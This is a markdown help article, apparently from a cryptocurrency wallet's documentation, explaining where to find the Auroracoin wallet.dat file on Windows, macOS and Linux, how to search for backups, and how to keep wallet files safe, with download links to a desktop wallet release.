---
title: "Find Auroracoin wallet.dat Location: Windows, Mac, Linux"
description: "Locate your Auroracoin wallet.dat file on Windows, macOS, or Linux. Learn how to find hidden data folders and secure your private keys before recovery."
primary_keyword: "auroracoin wallet.dat location"
silo: "recovery"
updated: 2026-10-10
---

![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)

[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)

# Find the Auroracoin wallet.dat File Location on Your Computer

Locating your Auroracoin wallet.dat file is the essential first step for anyone looking to recover legacy AUR balances or migrate from the original Auroracoin Core client to the modern Aurora Wallet. This specific file contains the encrypted private keys that grant access to your funds on the blockchain; without it, or a verified backup, your digital assets remain inaccessible within the legacy system's architecture. You can find out more about the history of the project on the [official about page](https://auroracoin.net/about).

## You'll see this if

*   You are attempting to migrate from the legacy Auroracoin Core (Qt) client to the modern Aurora Wallet.
*   You have found an old hard drive or backup and need to identify where your private keys are stored.
*   The legacy software is failing to launch, and you need to manually rescue the wallet file for use in recovery tools.
*   You are performing a routine security audit of your historical Auroracoin backups.
*   You are trying to follow the [Auroracoin wallet.dat recovery](https://auroracoin.net/recovery/wallet-dat) guide but cannot find the data directory.

## Why this happens

The original Auroracoin Core software was designed as a full-node client, which stores its operational data in system-specific folders that are hidden by default to prevent accidental deletion or modification by users. These directories, often referred to as "data folders," contain not only your wallet file but also the entire multi-gigabyte history of the Auroracoin blockchain.

Operating systems like Windows and macOS hide these folders within "AppData" or "Library" paths to simplify the user experience, but this makes manual file management difficult when you need to perform a migration. Furthermore, if you chose a custom data directory during the initial installation years ago, the file may not be in the standard location, requiring a deeper system-wide search. For users transitioning to a more modern approach, learning about [BIP-39 seed phrases](https://auroracoin.net/recovery/seed-phrase) is highly recommended.

## The fix

Finding the `wallet.dat` file requires navigating to the hidden directories specific to your operating system. Follow the steps below for your platform.

### Locating the file on Windows
1.  Press the **Windows Key + R** on your keyboard to open the "Run" dialog box.
2.  Type `%APPDATA%\Auroracoin` into the text field and press **Enter**.
3.  A File Explorer window will open directly into the Auroracoin data directory.
4.  Search for the file named `wallet.dat`. If you see extensions hidden, it may simply appear as "wallet".

### Locating the file on macOS
1.  Open **Finder** and ensure it is the active application.
2.  Click the **Go** menu in the top menu bar.
3.  Select **Go to Folder...** (or press Command+Shift+G).
4.  Type `~/Library/Application Support/Auroracoin/` and click **Go**.
5.  Locate `wallet.dat` within the resulting folder.

### Locating the file on Linux
1.  Open your preferred **File Manager** (e.g., Nautilus, Dolphin).
2.  Navigate to your **Home** directory.
3.  Enable "Show Hidden Files" (usually by pressing **Ctrl + H**).
4.  Look for a folder named `.auroracoin` (note the leading dot).
5.  Open the folder to find `wallet.dat`.

### Searching for custom locations
If the file is not in the default path, you likely specified a different drive during setup.
1.  Use your system's search tool (Start Menu search or Finder Spotlight).
2.  Search for `wallet.dat` across all attached drives, including external USB sticks and backup HDDs.
3.  Look for folders named "AUR", "Auroracoin-Qt", or "Blockchain Data".

## If that didn't work

If a search for `wallet.dat` returns no results, your file may have been renamed during a previous backup attempt. Search for files ending in `.bak` or files with "wallet" in the name, such as `wallet_backup_2017.dat`. 

If you suspect the file has been deleted, immediately stop using the drive to prevent overwriting the data. Use a file recovery utility designed to look for deleted `*.dat` files. In some cases, the file might be located in a `backups` subfolder within the original Auroracoin data directory. Always check the [22-import-wallet-dat.md](22-import-wallet-dat.md) guide if you find a file but it appears to be a different format.

> [!WARNING]
> Never rename a found `wallet.dat` file while the legacy wallet software is running, as this can lead to file corruption. Always perform file operations while the application is completely closed.

## Prevention

To avoid losing track of your wallet files in the future, follow these data management best practices:

*   **Upgrade to Seed Phrases:** The modern Aurora Wallet is designed to use 12 or 24-word recovery phrases, eliminating the need to track a single physical file.
*   **Documentation:** Maintain a secure, offline record of where you store your digital backups.
*   **Standard Naming:** If you make backups of your `wallet.dat`, use a clear naming convention like `wallet-YYYY-MM-DD.dat` but always keep a copy named exactly `wallet.dat` for the software to recognize.
*   **Multiple Backups:** Follow the [33-backup-best-practice.md](33-backup-best-practice.md) rules by keeping copies on at least two separate physical devices.

## FAQ

**Can I open wallet.dat with a text editor?**
No. The `wallet.dat` file is a binary database file (Berkeley DB format). Opening it with Notepad or TextEdit will show garbled text and could potentially corrupt the file if you accidentally save changes.

**I found multiple wallet.dat files. Which one do I use?**
Treat every file as a potential source of funds. A newer file may contain addresses generated recently, while an older one might be your only uncorrupted copy. It is best to test each one individually using the "bridge" method described in the migration guides.

**Is it safe to email my wallet.dat to myself?**
Absolutely not. Email providers scan attachments, and if your email account is ever compromised, the attacker would have full access to your private keys. If the wallet is not encrypted, they can steal your AUR instantly.

**What if my wallet.dat is from 2014?**
The age of the file does not matter. As long as the file is not corrupted and you have the password (if encrypted), the private keys inside are still valid for accessing your Auroracoin balance on the current blockchain.

---

## The current release

Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:

[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)

Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)

## Related articles

- [22-import-wallet-dat.md](22-import-wallet-dat.md)
- [27-migrate-from-auroracoin-core.md](27-migrate-from-auroracoin-core.md)
- [33-backup-best-practice.md](33-backup-best-practice.md)
- [36-self-custody-basics.md](36-self-custody-basics.md)
